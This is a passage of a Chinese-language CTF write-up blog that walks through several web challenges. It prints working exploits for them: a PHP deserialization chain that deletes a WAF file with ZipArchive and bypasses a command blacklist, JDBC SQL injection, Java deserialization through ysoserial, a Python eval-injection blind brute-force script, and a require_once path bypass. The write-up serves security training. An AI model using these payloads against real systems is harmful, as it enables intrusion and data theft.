<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;prepare(</span><br><span class="line">    <span class="string">&quot;SELECT name, description FROM products WHERE name = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  check_errors(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">  check_errors(<span class="variable">$statement</span>-&gt;execute());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;get_result();</span><br><span class="line">  check_errors(<span class="variable">$res</span>);</span><br><span class="line">  <span class="variable">$product</span> = <span class="variable">$res</span>-&gt;fetch_assoc();</span><br><span class="line">  <span class="variable">$statement</span>-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$product</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点</p>
<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
<h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//include(&#x27;shell.php&#x27;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span> = <span class="keyword">new</span> Open (<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file= <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">print</span> (base64_encode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//@unserialize(base64_decode($_POST[&#x27;unser&#x27;]));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210322183621.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;��<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>去php文档里面找了之后发现有个ZipArchive内置类，里面有个open方法，可以删除文件</p>
<p><img src="https://img.npfs06.top/20210322184916.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210322184939.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apen</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$game</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$game</span> = serialize(<span class="variable">$game</span>);</span><br><span class="line"><span class="keyword">print</span>(base64_encode(<span class="variable">$game</span>));</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210322183659.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>waf.txt文件被删除，我们在尝试读取下shell.php文件，可以发现是读取失败的，因为这个时候，<code>if</code>语句一直为真了</p>
<p><img src="https://img.npfs06.top/20210322183823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>构造命令即可,因为<code>nl</code>被过滤了，我们可以用斜杠分隔</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//include(&#x27;shell.php&#x27;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> ;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;n\l /flag&quot;</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file= <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">print</span> (base64_encode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//@unserialize(base64_decode($_POST[&#x27;unser&#x27;]));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">Tz<span class="meta">o0</span>OiJHYW<span class="number">1</span>lIj<span class="meta">o2</span>O<span class="symbol">ntzOjg6</span>I<span class="symbol">nVzZXJuYW1</span>lIjtzOjU<span class="number">6</span>ImFkbWluIjtzOj<span class="name">g6</span>I<span class="symbol">nBhc3</span><span class="symbol">N3</span>b<span class="number">3</span>JkIjtzOjU<span class="number">6</span>ImFkbWluIjtzOj<span class="name">g6</span>I<span class="symbol">nJlZ2</span>lzdGVyIjtzOjU<span class="number">6</span>ImFkbWluIjtzOjQ<span class="number">6</span>ImZpbGUi<span class="meta">O086</span><span class="symbol">NDoiT3</span>BlbiI<span class="number">6</span>MDp<span class="number">7</span>fX<span class="name">M6</span>ODoiZmlsZW<span class="number">5</span>hbWUi<span class="meta">O047</span>cz<span class="meta">o3</span>OiJjb<span class="number">250</span>ZW<span class="number">50</span>IjtzOjk<span class="number">6</span>I<span class="name">m5</span>cbCAvZmxhZyI<span class="number">7</span>fQ==</span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>下载下来class文件，jd-gui反编译</p>
<p><img src="https://img.npfs06.top/20210324222013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>/common/test</code>和<code>/sqlDct</code>这两个路由都是可以直接访问的</p>
<p>我们跟进到<code>sqlDict</code>路由的<code>getTableData</code>函数</p>
<p><img src="https://img.npfs06.top/20210324222340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>根据dbName传入值。然后创建数据库连接。并且带入sql执行。很明显，<code>dbName</code>可控，存在sql注入</p>
<p>jdbc类似URL解析。所以当我们输入<code>myapp#&#39; union select 1#</code>时<br><code>#</code>在URL中是锚点，没有实际意义</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://mysqldbserver:3306/myapp#&#x27; union <span class="keyword">select</span> <span class="number">1</span>#</span><br><span class="line">会被解析成</span><br><span class="line">jdbc:mysql://mysqldbserver:<span class="number">3306</span>/myapp</span><br><span class="line"></span><br><span class="line">再带入sql语句</span><br><span class="line"><span class="keyword">Select</span> TABLE_COMMENT <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES <span class="keyword">Where</span> table_schema = <span class="string">&#x27;#&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>#<span class="string">&#x27; and table_name=&#x27;</span><span class="string">&quot; + TableName + &quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">第一个#被单引号包裹。成了普通的#字符。第二个#注释掉了后面的语句。造成sql注入</span></span><br></pre></td></tr></table></figure>
<p>所以我们可以这样构造</p>
<p><img src="https://img.npfs06.top/20210324223039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到password</p>
<p>通过信息收集我们发现了这么个东西：</p>
<p><img src="https://img.npfs06.top/20210324223213.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>百度搜索一波，发现spring boot存在这么个页面：<code>swagger-ui.html</code>我们访问下，有三个路由</p>
<p><img src="https://img.npfs06.top/20210324224141.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在/common/user/login接口，用我们刚刚得到的账号密码登入，得到一串token</p>
<blockquote>
<p>下方的特征可以作为序列化的标志参考:</p>
<p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p>
<p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p>
</blockquote>
<p>明显为java反序列化</p>
<p><img src="https://img.npfs06.top/20210324224333.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以用工具SerializationDumper来解析数据</p>
<p>用法:</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>SerializationDumper-[*version*].<span class="keyword">jar </span>[*<span class="number">16</span>进制数据*)]</span><br></pre></td></tr></table></figure>
<p>这里不详细写了，重点是找到反序列话注入点</p>
<p>尝试把序列化的token字段作为Authorization去印证这个UI的/common/user/current接口。显示成功登录。</p>
<p><img src="https://img.npfs06.top/20210324224910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>直接用yso生成payload</p>
<p><img src="https://img.npfs06.top/20210324221829.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210324225143.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>监听端口，把生成文件里的token替换掉原token，即可得到flag</p>
<h2 id="PyCalX-1-amp-2"><a href="#PyCalX-1-amp-2" class="headerlink" title="PyCalX 1&amp;2"></a>PyCalX 1&amp;2</h2><p>就是个计算器</p>
<p><img src="https://img.npfs06.top/20210324235635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>直接给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 =  </span><br><span class="line"></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(<span class="built_in">str</span>(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(value1).isdigit() ^ <span class="built_in">str</span>(value2).isdigit():</span><br><span class="line">        print(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>value1+op+value2<br>value1和2不能出现<code>&quot;()[]\</code><br>op的第一个字符只能是<code>+-/*=!</code></p>
<p>最后是通过<code>calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</code>拼接</p>
<p>而repr() 函数是将对象转化为供解释器读取的，看下面的例子</p>
<p><img src="https://img.npfs06.top/20210325000340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p> repr在转化字符串时会默认套上单引号，而由于op是没过滤单引号，所以可以导致val2逃逸 </p>
<p>最初的执行是这样的</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1&#x27;  +  &#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>但由于op只判断第一个值。我们可以插入单引号。并且注释后面的单引号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;</span>  +<span class="string">&#x27;  &#x27;</span> and <span class="built_in">source</span> <span class="keyword">in</span> flag<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>可以看到。我们op输入+’。成功闭合语句。然后在value2的地方构造语句并注释，返回类型为True或False，构造布尔盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.printable</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://0a1bd9a5-ef79-49d0-8cda-cd4d937ff543.node3.buuoj.cn/cgi-bin/pycalx.py&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;value1&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;op&#x27;</span>: <span class="string">&#x27;+\&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;value2&#x27;</span>: <span class="string">&#x27;and 1 and source in FLAG#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span>: flag+i</span><br><span class="line">        &#125;</span><br><span class="line">        re = requests.get(url, params=data)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;True&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=i</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>




<h2 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload1:</p>
<p><a href="http://npfs06.top/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p>
<p>payload2:</p>
<p><code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</p>
